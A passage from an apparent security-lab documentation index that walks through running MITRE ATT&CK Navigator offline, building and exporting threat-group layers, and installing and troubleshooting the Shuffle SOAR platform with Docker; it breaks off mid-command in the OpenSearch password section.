product and service community.\",\n    \"created\": \"2018-01-17T12:56:55.080Z\",\n    \"modified\": \"2024-11-12T14:00:00.188Z\",\n    \"collections\": [\n        {\n            \"id\": \"x-mitre-collection--1f5f1533-f617-4ca8-9ab4-6a02367fa019\",\n            \"created\": \"2018-01-17T12:56:55.080Z\",\n            \"versions\": [\n                {\n                    \"version\": \"16.1\",\n                    \"url\": \"assets/enterprise-attack.json\",\n                    \"modified\": \"2024-11-12T14:00:00.188Z\"\n                }\n            ],\n            \"name\": \"Enterprise ATT&amp;CK\",\n            \"description\": \"ATT&amp;CK for Enterprise provides a knowledge base of real-world adversary behavior targeting traditional enterprise networks. ATT&amp;CK for Enterprise covers the following platforms: Windows, macOS, Linux, PRE, Office 365, Google Workspace, IaaS, Network, and Containers.\"\n        },\n        {\n            \"id\": \"x-mitre-collection--dac0d2d7-8653-445c-9bff-82f934c1e858\",\n            \"created\": \"2018-01-17T12:56:55.080Z\",\n            \"versions\": [\n                {\n                    \"version\": \"16.1\",\n                    \"url\": \"assets/mobile-attack.json\",\n                    \"modified\": \"2024-11-12T14:00:00.188Z\"\n                }\n            ],\n            \"name\": \"Mobile ATT&amp;CK\",\n            \"description\": \"ATT&amp;CK for Mobile is a matrix of adversary behavior against mobile devices (smartphones and tablets running the Android or iOS/iPadOS operating systems). ATT&amp;CK for Mobile builds upon NIST's Mobile Threat Catalogue and also contains a separate matrix of network-based effects, which are techniques that an adversary can employ without access to the mobile device itself.\"\n        },\n        {\n            \"id\": \"x-mitre-collection--90c00720-636b-4485-b342-8751d232bf09\",\n            \"created\": \"2020-10-27T14:49:39.188Z\",\n            \"versions\": [\n                {\n                    \"version\": \"16.1\",\n                    \"url\": \"assets/ics-attack.json\",\n                    \"modified\": \"2024-11-12T14:00:00.188Z\"\n                }\n            ],\n            \"name\": \"ICS ATT&amp;CK\",\n            \"description\": \"The ATT&amp;CK for Industrial Control Systems (ICS) knowledge base categorizes the unique set of tactics, techniques, and procedures (TTPs) used by threat actors in the ICS technology domain. ATT&amp;CK for ICS outlines the portions of an ICS attack that are out of scope of Enterprise and reflects the various phases of an adversary\\u2019s attack life cycle and the assets and systems they are known to target.\"\n        }\n    ]\n}\n</code></pre> <p>Using the <code>json.tool</code> module, which is already installed on the Ubuntu VM, validate all JSON files to ensure they are syntactically correct.</p> <pre><code>python3 -m json.tool ~/mitre-offline/attack-navigator/nav-app/src/assets/index.json\npython3 -m json.tool ~/mitre-offline/attack-navigator/nav-app/src/assets/enterprise-attack.json\npython3 -m json.tool ~/mitre-offline/attack-navigator/nav-app/src/assets/mobile-attack.json\npython3 -m json.tool ~/mitre-offline/attack-navigator/nav-app/src/assets/ics-attack.json\n</code></pre> <p>If the file is valid, this command will output the JSON content. If there are syntax errors, it will display an error message.</p> <p>Modify the\u00a0<code>config.json</code>\u00a0file in\u00a0<code>nav-app/src/assets</code>\u00a0with following contents (change enabled to true, and <code>collection_index_url</code> and <code>data</code> values to <code>assets/index.json</code> and <code>assets/enterprise-attack.json</code> files).</p> <pre><code>nano ~/mitre-offline/attack-navigator/nav-app/src/assets/config.json\n</code></pre> <pre><code>{\n    \"collection_index_url\": \"assets/index.json\",\n\n    \"versions\": {\n        \"enabled\": true,\n        \"entries\": [\n            {\n                \"name\": \"Custom Data v14\",\n                \"version\": \"14\",\n                \"domains\": [\n                    {\n                        \"name\": \"Enterprise\",\n                        \"identifier\": \"enterprise-attack\",\n                        \"data\": [\"assets/enterprise-attack.json\"]\n                    }\n                ]\n            }\n        ]\n    },\n&lt;SNIP&gt;\n</code></pre> <p>Compress the mitre-offline folder for transfer.</p> <pre><code>cd ~/mitre-offline\ntar -czvf mitre-offline.tar.gz *\n</code></pre> <p>Transfer <code>mitre-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p>"},{"location":"navigator/navigator.html#on-the-air-gapped-environment","title":"On the Air-Gapped Environment","text":"<p>On the air-gapped Ubuntu VM, make a directory called mitre-offline and extract the transferred archive.</p> <pre><code>mkdir ~/mitre-offline &amp;&amp; cd ~/mitre-offline\ntar -xzvf ~/mitre-offline.tar.gz\n</code></pre> <p>Install LibreOffice and verify installation.</p> <pre><code>cd ~/mitre-offline/libre\nsudo dpkg -i *.deb\nlibreoffice\n</code></pre> <p>Install Node.js v18 and verify the installation.</p> <pre><code>cd ~/mitre-offline/nodejs\ntar -xvf node-v18.20.6-linux-x64.tar.xz \nsudo mv node-v18.20.6-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\nnpm --version\n</code></pre> <p>Install Angular CLI globally by linking it to the\u00a0<code>npm</code>\u00a0directory. This will create a global symlink for the Angular CLI, allowing you to use the\u00a0<code>ng</code>\u00a0command from anywhere. This process may take some time.</p> <pre><code>cd ~/mitre-offline/angular-cli/node_modules/@angular/cli\nnpm link\n</code></pre> <p>Verify that Angular CLI is installed correctly. This should display Angular CLI version 17 along with other related information.</p> <pre><code>ng version\n</code></pre> <pre><code>     _                      _                 ____ _     ___\n    / \\   _ __   __ _ _   _| | __ _ _ __     / ___| |   |_ _|\n   / \u25b3 \\ | '_ \\ / _` | | | | |/ _` | '__|   | |   | |    | |\n  / ___ \\| | | | (_| | |_| | | (_| | |      | |___| |___ | |\n /_/   \\_\\_| |_|\\__, |\\__,_|_|\\__,_|_|       \\____|_____|___|\n                |___/\n\n\nAngular CLI: 17.3.11\nNode: 18.20.6\nPackage Manager: npm 10.8.2\nOS: linux x64\n\nAngular: undefined\n... \n\nPackage                      Version\n------------------------------------------------------\n@angular-devkit/architect    0.1703.11\n@angular-devkit/core         17.3.11\n@angular-devkit/schematics   17.3.11\n@schematics/angular          17.3.11\n</code></pre>"},{"location":"navigator/navigator.html#run-mitre-attck-navigator","title":"Run MITRE ATT&amp;CK Navigator","text":"<p>Navigate to the\u00a0<code>nav-app</code>\u00a0directory and run the application.</p> <pre><code>cd ~/mitre-offline/attack-navigator/nav-app\nng serve --host 0.0.0.0\n</code></pre> <p>Open\u00a0<code>http://&lt;IP ADDRESS&gt;:4200</code>\u00a0in your browser. </p> <p></p> <p>Verify that creating new layer loads locally hosted JSON files (enterprise-attack, mobile-attack and ics-attack). </p> <p>Enterprise ATT&amp;CK (enterprise-attack.json)</p> <p></p> <p>Mobile ATT&amp;CK (mobile-attack.json)</p> <p></p> <p>ICS ATT&amp;CK (ics-attack.json)</p> <p></p> <p>Verify that you can also access the Navigator from the Ubuntu VM using the MITRE VM's IP address. Verify access to locally hosted JSON files.</p>"},{"location":"navigator/navigator.html#introduction-to-mitre-attck-navigator","title":"Introduction to MITRE ATT&amp;CK Navigator","text":""},{"location":"navigator/navigator.html#creating-a-new-layer","title":"Creating a New Layer","text":"<p>Navigate to the MITRE ATT&amp;CK Navigator at <code>http://&lt;IP Address&gt;:4200</code>. Select Create New Layer, then choose Enterprise ATT&amp;CK.</p> <p></p> <p>Select Layer Controls, then \"Settings.\" Change the Layer name to \"APT38.\u201d</p> <p></p> <p>Click Selection Controls, then select \"Search &amp; Multiselect.\" Search for APT38. Expand the Threat Groups section and click Select next to APT38. This will automatically select the techniques used by APT38.</p> <p></p>"},{"location":"navigator/navigator.html#manually-setting-colours","title":"Manually Setting Colours","text":"<p>Navigate to Technique Controls, select 'Background Colour,' and choose a colour that is easily identifiable (e.g., red).</p> <p></p> <p>To expand the subtechniques, navigate to Layer Controls, then click \"Expand Subtechniques.\u201d</p> <p></p> <p></p>"},{"location":"navigator/navigator.html#manually-adding-a-ttp","title":"Manually Adding a TTP","text":"<p>First navigate to Selection Controls and click \u201cdeselect 43 techniques.\u201d</p> <p></p> <p>To manually add a Tactic, Technique, or Procedure (TTP), click on the TTP (e.g., Scheduled Task/Job) and select the orange colour.</p> <p></p>"},{"location":"navigator/navigator.html#creating-an-adversary-profile","title":"Creating an Adversary Profile","text":"<p>Create a new layer using Enterprise ATT&amp;CK. Name the layer the Red Haast Eagle (or name of your own choice). </p> <p></p> <p>While holding down the control key, select multiple TTP\u2019s that your adversary profile will be using. You can copy the TTPs shown in the image, or choose your own. </p> <p></p> <p>While the TTPs are selected, navigate to Layer Controls, then Colour Setup. Set High Value to 3 and leave presets set to red to green.</p> <p></p>"},{"location":"navigator/navigator.html#setting-colours-by-assigning-scores-red-team","title":"Setting Colours by Assigning Scores (Red Team)","text":"<p>Navigate to Technique Controls, then Scores. Set the Score value to 0. The score can be defined and interpreted in many different ways. In this scenario, we will be looking at scores from the red team\u2019s planning perspective. A score of 0 means the red team wasn\u2019t successful in executing the following TTPs (shown in red), whereas a score of 3 means the red team was successful in executing the TTPs.</p> <p></p> <p>Select Compromise Accounts and Email Accounts, and set the score to 3. This means the red team was successful in executing the TTPs. This will render these specific TTPs in green.</p> <p></p> <p>Select Command and Scripting Interpreter and PowerShell and assign the score of 1. This implies the TTPs were executed and there were technical errors or TTPs were partially executed. This will render the TTPs in orange.</p> <p></p>"},{"location":"navigator/navigator.html#setting-colours-by-assigning-scores-blue-team","title":"Setting Colours by Assigning Scores (Blue Team)","text":"<p>Create a new layer using Enterprise ATT&amp;CK. Name the layer \"APT41\" and apply the TTPs used by APT41. Navigate to Layer Controls, then Colour Setup. Set High Value to 3 and set Presets to green to red.</p> <p></p> <p>With APT41\u2019s TTPs selected, assign a score of 0. This will render the TTPs in green, indicating that the red team was not successful in executing these TTPs.</p> <p></p> <p>Select Impersonation and File and Directory Discovery and assign the score of 3. This will render the TTPs in red, indicating that the red team was successful in executing these TTPs without being detected by the blue team. </p> <p></p> <p>There are many ways to implement colour coding, and it is up to you to define and interpret it.</p>"},{"location":"navigator/navigator.html#combining-multiple-layers","title":"Combining Multiple Layers","text":"<p>Close all layers. Create a new layer using Enterprise ATT&amp;CK. Name the layer \"APT38\" and apply the TTPs used by APT38. In the Colour Setup in Layer Controls, set the Low value to 1 and the High value to 3. Set the Presets to red to green.</p> <p></p> <p>While the APT38\u2019s TTPs are selected, assign the Score value of 1.</p> <p></p> <p>Create a second layer using Enterprise ATT&amp;CK. Name the layer \"APT41\" and apply the TTPs used by APT41. Set the Low value to 1 and High value to 3. Set the Presets to red to green. Assign the Score value of 1. </p> <p></p> <p>Create a third layer using Enterprise ATT&amp;CK. Name the layer \"APT28\" and apply the TTPs used by APT28. Set the Low value to 1 and High value to 3. Set the Presets to red to green. Assign the Score value of 1. </p> <p></p> <p>Create a new layer to combine the three layers. Select \"Create Layer from Other Layers.\" For Domain, select \"Enterprise ATT&amp;CK MITRE ATT&amp;CK v16.\" For Score Expression, enter \"a+b+c,\" which will combine the scores from the three layers. For Gradient and Colouring, select \"APT38\" (noting that they all use the same gradient and colouring). Click \"Create Layer.\"</p> <p></p> <p>This generates a combined layer. Red indicates a score of 1, meaning that only one APT uses the TTPs in red. Yellow indicates a score of 2, meaning that two APTs use the TTPs in yellow. Green indicates a score of 3, meaning that all three APTs use the TTPs in green.</p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer","title":"Exporting Layer","text":"<p>Within the Layer Controls tab, select \"Export.\" Selecting Code Blocks will download the layer as a JSON file. Table View will export all layers to Excel, and the Camera icon will render the layer as an SVG.</p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer-to-code-blocks","title":"Exporting Layer to Code Blocks","text":"<p>Within the Layer Controls tab, select \"Export\u201d then \u201cCode Blocks.\u201d This will automatically download the layer as JSON file. </p> <p></p> <p>Open a new tab and select Open Existing Layer. Select Upload from local and select the downloaded JSON file. </p> <p></p> <p>This loads the combined layer we created earlier. </p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer-to-table-view","title":"Exporting Layer to Table View","text":"<p>Within the Layer Controls tab, select \"Export\u201d then \u201cTable View.\u201d This will automatically download the layer as XLSX file. </p> <p></p> <p>Open the XLSX file in LibreOffice. This will display the three APT layers and the combined layer with the same colour rendering.</p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer-to-svg","title":"Exporting Layer to SVG","text":"<p>Within the Layer Controls tab, select \"Export\u201d then camera icon\u201d This will render layer to  Scalable Vector Graphics (SVG) file. An SVG file is a type of image that uses XML code to create two-dimensional graphics. Unlike PNG or JPG images, which can become blurry when resized, SVG images stay clear and sharp at any size. This makes them great for things like websites, logos, and diagrams. Click \u201cDownload SVG\u201d button.</p> <p></p> <p>This will automatically download the SVG file.</p> <p></p> <p>Double-click the downloaded SVG file. This will open the SVG file in a new tab in your web browser.</p> <p></p>"},{"location":"navigator/navigator.html#references","title":"References","text":"<ul> <li>https://attack.mitre.org/</li> <li>https://github.com/mitre-attack/attack-navigator</li> <li>https://www.youtube.com/watch?v=78RIsFqo9pM</li> <li>https://youtu.be/hN_r3JW6xsY?si=xer1ygx-pGLIJnI6</li> </ul>"},{"location":"shuffle/shuffle.html","title":"Shuffle","text":""},{"location":"shuffle/shuffle.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Shuffle is installed on an Ubuntu VM. Automated workflows were created using Shuffle, Wazuh, and TheHive. An attack simulation was conducted on the Windows and Ubuntu hosts in a safe and controlled environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) shuffle Ubuntu 22.04 LTS Shuffle (SOAR) 10.0.0.28 WazuhServer Centos Stream 9 Wazuh server (SIEM server) 10.0.0.20 hive Ubuntu 22.04 LTS TheHive (IR) 10.0.0.40 WS2019 Windows Server 2019 Wazuh agent (SIEM client) 10.0.0.24 SyslogUbuntu Ubuntu 22.04 LTS Wazuh agent, rsyslog server 10.0.0.26 Kali Kali Linux 2024.2 Attacker machine 192.168.1.161, 10.0.0.29 <p></p>"},{"location":"shuffle/shuffle.html#install-shuffle-online","title":"Install Shuffle online","text":""},{"location":"shuffle/shuffle.html#install-docker-using-the-apt-repository-ubuntu","title":"Install Docker using the apt repository (Ubuntu)","text":"<p>Before you install Docker Engine for the first time on a new host machine, you need to set up the Docker repository. Afterward, you can install and update Docker from the repository.</p> <p>Set up Docker's apt repository.</p> <pre><code># Add Docker's official GPG key:\nsudo apt-get update\nsudo apt-get install ca-certificates curl\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n\n# Add the repository to Apt sources:\necho \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\\n  $(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\\n  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\nsudo apt-get update\n</code></pre> <p>Install the Docker packages.</p> <pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n</code></pre> <p>Verify that the Docker Engine installation is successful by running the\u00a0<code>hello-world</code>\u00a0image.</p> <pre><code>sudo docker run hello-world\n</code></pre>"},{"location":"shuffle/shuffle.html#install-docker-engine-manually-ubuntu","title":"Install Docker Engine manually (Ubuntu)","text":"<p>All the required deb files for Docker Engine have been downloaded and put together in the folder called docker. For your reference, the steps for downloading the required deb files for Docker Engine are documented below.</p> <p>On Ubuntu host with internet connection:</p> <p>You will need to download a new file each time you want to upgrade Docker Engine. Select your Ubuntu version in the list.</p> <p>Go to\u00a0<code>pool/stable/</code>\u00a0and select the applicable architecture (<code>amd64</code>,\u00a0<code>armhf</code>,\u00a0<code>arm64</code>, or\u00a0<code>s390x</code>).</p> <p>Download the following\u00a0<code>deb</code>\u00a0files for the Docker Engine, CLI, containerd, and Docker Compose packages:</p> <ul> <li><code>containerd.io_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-ce_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-ce-cli_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-buildx-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-compose-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li> </ul> <p>Install the\u00a0<code>.deb</code>\u00a0packages. Change directory into the docker folder and run:</p> <pre><code>cd docker\nsudo dpkg -i *\n</code></pre> <p>Run <code>sudo service docker start</code></p>"},{"location":"shuffle/shuffle.html#install-docker-engine-manually-centos","title":"Install Docker Engine manually (CentOS)","text":"<p>All the required deb files for Docker Engine have been downloaded and put together in the folder called docker. For your reference, the steps for downloading the required deb files for Docker Engine are documented below.</p> <p>On CentOS host with internet connection:</p> <p>If you can't use Docker's rpm repository to install Docker Engine, you can download the .rpm file for your release and install it manually. You need to download a new file each time you want to upgrade Docker Engine.</p> <p>Go to https://download.docker.com/linux/centos/ and choose your version of CentOS. Then browse to x86_64/stable/Packages/ and download the .rpm file for the Docker version you want to install.</p> <p>Go to\u00a0<code>pool/stable/</code>\u00a0and select the applicable architecture (<code>amd64</code>,\u00a0<code>armhf</code>,\u00a0<code>arm64</code>, or\u00a0<code>s390x</code>).</p> <p>Download the following\u00a0rpm\u00a0files for the Docker Engine, CLI, containerd, and Docker Compose packages:</p> <ul> <li><code>containerd.io_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-ce_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-ce-cli_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-buildx-plugin_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-compose-plugin_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> </ul> <p>Install the\u00a0<code>.rpm</code>\u00a0packages. Change directory into the docker folder and run:</p> <pre><code>cd docker\nsudo yum install *\n</code></pre> <p>Start the docker</p> <pre><code>sudo service docker start\n</code></pre>"},{"location":"shuffle/shuffle.html#download-shuffle-github-repository","title":"Download Shuffle GitHub Repository","text":"<p>Clone or download the Shuffle repository as a zip archive from the Shuffle GitHub page. If git command cannot be installed, download the zip.</p> <pre><code>sudo apt install git\ncd /opt\nsudo git clone https://github.com/Shuffle/Shuffle\ncd Shuffle\n</code></pre> <p></p> <p>If Shuffle-main.zip is downloaded, unzip  to the /opt directory </p> <pre><code>sudo unzip Shuffle-main.zip -d /opt\nsudo unzip python-apps-master.zip -d /opt/Shuffle-main/shuffle-apps\n</code></pre> <p>Change into /opt/Shuffle directory</p> <p>Fix prerequisites for the Opensearch database (Elasticsearch):</p> <pre><code>cd /opt/Shuffle-main\nmkdir shuffle-database                    # Create a database folder\nsudo chown -R 1000:1000 shuffle-database  # IF you get an error using 'chown', add the user first with 'sudo useradd opensearch'\n\nsudo swapoff -a                           # Disable swap\n</code></pre> <p>Run docker-compose.</p> <pre><code>cd \ndocker compose up -d\n</code></pre> <p>Recommended for Opensearch to work well</p> <pre><code>sudo sysctl -w vm.max_map_count=262144             \n# https://www.elastic.co/guide/en/elasticsearch/reference/current/vm-max-map-count.html\n</code></pre>"},{"location":"shuffle/shuffle.html#install-shuffle-offline","title":"Install Shuffle offline","text":"<p>This procedure will help you export what you need to run Shuffle on a no internet host.</p>"},{"location":"shuffle/shuffle.html#pre-requisite","title":"Pre-requisite","text":"<ul> <li>Both machines has Docker and Docker Compose installed already</li> <li>Your host machine already needs the images on it to make them exportable</li> </ul>"},{"location":"shuffle/shuffle.html#pull-images-on-original-machine","title":"Pull images on original machine","text":"<p>Shuffle need a few base images to work:</p> <ul> <li>shuffle-frontend</li> <li>shuffle-backend</li> <li>shuffle-orborus</li> <li>shuffle-worker</li> <li>shuffle:app_sdk</li> <li>opensearch</li> <li>shuffle-subflow</li> </ul> <pre><code>docker pull ghcr.io/frikky/shuffle-backend\ndocker pull ghcr.io/frikky/shuffle-frontend \ndocker pull ghcr.io/frikky/shuffle-orborus\ndocker pull frikky/shuffle:app_sdk \ndocker pull ghcr.io/frikky/shuffle-worker \ndocker pull opensearchproject/opensearch:2.5.0 \ndocker pull registry.hub.docker.com/frikky/shuffle:shuffle-subflow_1.0.0\ndocker pull frikky/shuffle:wazuh_1.0.0\ndocker pull frikky/shuffle:thehive_1.1.3\n</code></pre> <pre><code>docker pull ghcr.io/shuffle/shuffle-backend\ndocker pull ghcr.io/shuffle/shuffle-frontend \ndocker pull ghcr.io/shuffle/shuffle-orborus\ndocker pull ghcr.io/shuffle/shuffle-app_sdk:latest\ndocker pull ghcr.io/shuffle/shuffle-worker:latest\ndocker pull opensearchproject/opensearch:2.14.0\ndocker pull frikky/shuffle-subflow\ndocker pull frikky/shuffle:shuffle-tools_1.2.0\ndocker pull frikky/shuffle:wazuh_1.0.0\ndocker pull frikky/shuffle:thehive_1.1.3\n</code></pre> <p>Be careful with the versioning for opensearch, all other are going to use the tag \"latest\". You will also need to download and transfer ALL the apps you want to use. These can be discovered as such:</p> <pre><code>docker images | grep -i shuffle\n</code></pre> <p>Save images and archive them</p> <pre><code>mkdir shuffle-export\ncd shuffle-export\n\ndocker save ghcr.io/shuffle/shuffle-backend:latest &gt; backend.tar\ndocker save ghcr.io/shuffle/shuffle-frontend:latest &gt; frontend.tar\ndocker save ghcr.io/shuffle/shuffle-orborus:latest &gt; orborus.tar\ndocker save ghcr.io/shuffle/shuffle-app_sdk:latest &gt; app_sdk.tar\n##docker save frikky/shuffle:app_sdk &gt; app_sdk.tar\n##docker save ghcr.io/frikky/shuffle-worker:latest &gt; worker.tar\ndocker save ghcr.io/shuffle/shuffle-worker:latest &gt; worker.tar\ndocker save opensearchproject/opensearch:2.14.0 &gt; opensearch.tar\ndocker save frikky/shuffle-subflow:latest &gt; sublow.tar\ndocker save frikky/shuffle:shuffle-tools_1.2.0 &gt; shuffle-tools.tar\ndocker save frikky/shuffle:wazuh_1.0.0 &gt; wazuh.tar\ndocker save frikky/shuffle:thehive_1.1.3 &gt; thehive.tar\n\ngit clone https://github.com/Shuffle/python-apps.git\n\nwget https://raw.githubusercontent.com/Shuffle/Shuffle/master/.env\nwget https://raw.githubusercontent.com/Shuffle/Shuffle/master/docker-compose.yml\n\ncd .. \ntar cvf shuffle-export.tar.gz shuffle-export\n</code></pre> <p>Export shuffle-export.tar.gz to the host without internet connection</p> <p>Import docker images to host without internet</p> <pre><code>tar xvf shuffle-export.tar.gz -C /opt\ncd /opt/shuffle-export\nfind -type f -name \"*.tar\" -exec docker load --input \"{}\" \\;\n</code></pre> <p>Create folders to add the python apps</p> <pre><code>mkdir shuffle-apps\ncp -r python-apps/* shuffle-apps/\n</code></pre> <p>Create a folder called shuffle-database and change the ownership.</p> <p>If you get an error using 'chown', add the user first with 'sudo useradd opensearch'</p> <p>Disable swap</p> <p>Set the <code>vm.max_map_count</code> kernel parameter to 262144. This is often needed for applications like Elasticsearch or Opensearch that require a higher limit for the number of virtual memory areas a process can have.</p> <pre><code>mkdir shuffle-database  \nsudo chown -R 1000:1000 shuffle-database  \nsudo swapoff -a                          \nsudo sysctl -w vm.max_map_count=262144\n</code></pre> <p>Run <code>docker images</code> </p> <p>Edit the image names in docker-compose.yml to align it with the output from <code>docker images</code></p> <pre><code>docker images\nREPOSITORY                               TAG                     IMAGE ID       CREATED         SIZE\nregistry.hub.docker.com/frikky/shuffle   shuffle-subflow_1.0.0   5ed48be6f649   33 hours ago    293MB\nfrikky/shuffle                           app_sdk                 1dde46cd09da   10 days ago     291MB\nghcr.io/frikky/shuffle-worker            latest                  adb137fa1718   15 months ago   44.4MB\nopensearchproject/opensearch             2.5.0                   5a030d679ac7   18 months ago   1.17GB\nghcr.io/frikky/shuffle-backend           latest                  2e3d97ae8e30   21 months ago   57.9MB\nghcr.io/frikky/shuffle-frontend          latest                  be49fe2395d3   21 months ago   191MB\nghcr.io/frikky/shuffle-orborus           latest                  068b942b0302   21 months ago   29.9MB\n</code></pre> <pre><code>services:\n  frontend:\n    image: ghcr.io/frikky/shuffle-frontend:latest\n\n  backend:\n    image: ghcr.io/frikky/shuffle-backend:latest\n\n  orborus:\n    image: ghcr.io/frikky/shuffle-orborus:latest\n\n  opensearch:\n    image: opensearchproject/opensearch:2.5.0 \n</code></pre> <p>Run docker-compose.</p> <pre><code>docker compose up -d\n</code></pre>"},{"location":"shuffle/shuffle.html#troubleshooting","title":"Troubleshooting","text":"<p>Verify that there are no major errors in the logs and all containers are up and running </p> <p>Check docker processes</p> <pre><code>docker ps \n\nCONTAINER ID   IMAGE                                    COMMAND                  CREATED         STATUS         PORTS                                                                                NAMES\n6304c903bdde   ghcr.io/frikky/shuffle-frontend:latest   \"/entrypoint.sh ngin\u2026\"   3 minutes ago   Up 3 minutes   0.0.0.0:3001-&gt;80/tcp, [::]:3001-&gt;80/tcp, 0.0.0.0:3443-&gt;443/tcp, [::]:3443-&gt;443/tcp   shuffle-frontend\n899ab92ccdd5   ghcr.io/frikky/shuffle-backend:latest    \"./webapp\"               3 minutes ago   Up 3 minutes   0.0.0.0:5001-&gt;5001/tcp, :::5001-&gt;5001/tcp                                            shuffle-backend\ncccd0236ead3   ghcr.io/frikky/shuffle-orborus:latest    \"./orborus\"              3 minutes ago   Up 3 minutes                                                                                        shuffle-orborus\nfaa724f843ad   opensearchproject/opensearch:2.5.0       \"./opensearch-docker\u2026\"   3 minutes ago   Up 3 minutes   9300/tcp, 9600/tcp, 0.0.0.0:9200-&gt;9200/tcp, :::9200-&gt;9200/tcp, 9650/tcp              shuffle-opensearch\n</code></pre> <p>Check docker container logs</p> <pre><code>docker logs shuffle-backend\ndocker logs shuffle-frontend\ndocker logs shuffle-orborus\ndocker logs shuffle-opensearch\n</code></pre> <p>Check loaded docker images</p> <pre><code>root@shuffleoffline:/opt/shuffle-exp# docker images\nREPOSITORY                               TAG                                        IMAGE ID       CREATED        SIZE\nfrikky/shuffle                           TheHive-244ac27f71490576f2152f1a478763dd   04651821b9a9   11 hours ago   292MB\nfrikky/shuffle                           thehive_1.1.0                              04651821b9a9   11 hours ago   292MB\nfrikky/shuffle                           Wazuh-2f5945bb5a582a6b676ba7c212412cdb     c6e36c51b505   11 hours ago   292MB\nfrikky/shuffle                           wazuh_1.1.0                                c6e36c51b505   11 hours ago   292MB\n&lt;none&gt;                                   &lt;none&gt;                                     15951f6d8452   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     b99fc014293d   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     5e2ccf369d65   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     dafc616bc131   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     71fa350d234f   25 hours ago   291MB\nfrikky/shuffle                           shuffle-tools_1.2.0                        4159398549c0   3 days ago     387MB\nfrikky/shuffle                           shuffle-tools_1.1.0                        5712b5ea194b   3 days ago     362MB\nregistry.hub.docker.com/frikky/shuffle   shuffle-tools_1.1.0                        5712b5ea194b   3 days ago     362MB\nfrikky/shuffle-subflow                   latest                                     5ed48be6f649   3 days ago     293MB\nfrikky/shuffle                           thehive_1.1.3                              9b1209a0ba38   3 days ago     297MB\nfrikky/shuffle                           app_sdk                                    1dde46cd09da   12 days ago    291MB\nghcr.io/shuffle/shuffle-frontend         latest                                     30c4090d085c   3 weeks ago    196MB\nghcr.io/shuffle/shuffle-worker           latest                                     9f7c39d5fb1e   3 weeks ago    79MB\nghcr.io/shuffle/shuffle-backend          latest                                     59613e03c036   3 weeks ago    93.4MB\nghcr.io/shuffle/shuffle-app_sdk          latest                                     3ac4837de611   3 weeks ago    291MB\nopensearchproject/opensearch             2.14.0                                     bf1e1cd1fa30   2 months ago   1.33GB\nghcr.io/shuffle/shuffle-orborus          latest                                     7457cc8b6210   3 months ago   67.7MB\nfrikky/shuffle                           wazuh_1.0.0                                8a72f12273c6   3 years ago    66MB\n</code></pre> <p>If the orborus logs shows that it is trying to pull the images from the internet, tag your locally loaded images by running docker tag  <pre><code>docker logs shuffle-orborus\n...\n2024/09/07 23:36:59 [DEBUG] Pulling image ghcr.io/shuffle/shuffle-app_sdk:latest\n2024/09/07 23:37:39 [ERROR] Failed getting image ghcr.io/shuffle/shuffle-app_sdk:latest: Error response from daemon: Get \"https://ghcr.io/v2/\": dial tcp: lookup ghcr.io on 127.0.0.53:53: read udp 127.0.0.1:58367-&gt;127.0.0.53:53: i/o timeout\n</code></pre> <pre><code>docker tag 3ac4837de611 ghcr.io/shuffle/shuffle-app_sdk:latest\n</code></pre> <p>If you are using older version of opensearch (&lt; 2.14.0), you may encounter authentication issues as shown by the opensearch logs:</p> <pre><code>docker logs shuffle-opensearch\n...\nAuthentication finally failed for admin from 172.18.0.4:51382\n</code></pre> <p>If this is the case, access the opensearch, navigate to /config/opensearch-security and edit the configuration file:</p> <pre><code>docker exec -it shuffle-opensearch /bin/bash\n[opensearch@shuffle-opensearch config]$ cd config/opensearch-security/\n</code></pre> <pre><code>[opensearch@shuffle-opensearch opensearch-security]$ cat internal_users.yml \n---\n# This is the internal user database\n# The hash value is a bcrypt hash and can be generated with plugin/tools/hash.sh\n\n_meta:\n  type: \"internalusers\"\n  config_version: 2\n\n# Define your internal users here\n\n## Demo users\n\nadmin:\n  hash: \"$2a$12$VcCDgh2NDk07JGN0rjGbM.Ad41qVR/YFJcgHp0UGns5JDymv..TOG\"\n  reserved: true\n  backend_roles:\n  - \"admin\"\n  description: \"Demo admin user\"\n</code></pre> <p>There admin hash does not match with admin password defined in .env file</p> <pre><code># DATABASE CONFIGURATIONS\n...\nSHUFFLE_OPENSEARCH_USERNAME=\"admin\"\nSHUFFLE_OPENSEARCH_PASSWORD=\"StrongShufflePassword321!\"\n</code></pre> <p>The bcrypt hash for the password should be:</p> <pre><code>#htpasswd -bnBC 12 \"\" 